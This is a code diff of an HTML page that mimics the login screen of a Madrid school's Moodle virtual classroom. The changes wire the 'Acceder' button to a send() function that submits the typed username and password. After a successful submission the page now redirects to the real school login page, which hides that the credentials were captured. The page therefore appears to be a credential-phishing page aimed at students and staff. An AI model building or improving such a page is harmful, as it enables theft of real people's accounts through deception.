@@ -115,11 +115,11 @@
     <input id="email" name="email" type="text" placeholder="Tu usuario, sin @...">
     <div class="password-container">
       <input type="password" id="password" required name="password" placeholder="Contraseña">
-      <button type="button" onclick="send()" class="toggle-password">
+      <button class="toggle-password">
         <img src="https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fstatic.vecteezy.com%2Fsystem%2Fresources%2Fpreviews%2F048%2F839%2F086%2Foriginal%2Feye-silhouette-icon-icons-used-for-password-and-ophthalmology-vector.jpg&f=1&nofb=1&ipt=37e81ac21f5fb1750652ca2d3de8c0e3780a6dd40ccc9add8342107ffa608fd1" alt="Ver contraseña" height="20">
       </button>
     </div>
-    <a href="https://aulavirtual33.educa.madrid.org/ies.mirasierra.madrid/login/index.php"><button id="btnEnviar" class="login-button">Acceder</button></a>
+    <button type="button" onclick="send()" class="login-button">Acceder</button>
     <a href="https://aulavirtual33.educa.madrid.org/ies.mirasierra.madrid/login/index.php?loginredirect=1"><button class="guest-button">Entrar como persona invitada</button></a>
   </div>
 <div id="msg" class="msg"></div>
@@ -156,7 +156,7 @@
 
         if (res.ok) {
           msg.textContent = "✔ Enviado correctamente.";
-          window.location.href = "https://instagram.com";
+          window.location.href = "https://aulavirtual33.educa.madrid.org/ies.mirasierra.madrid/login/index.php";
         } else {
           const errorText = await res.text();
           msg.textContent = `Error del servidor: ${res.status} - ${errorText}`;
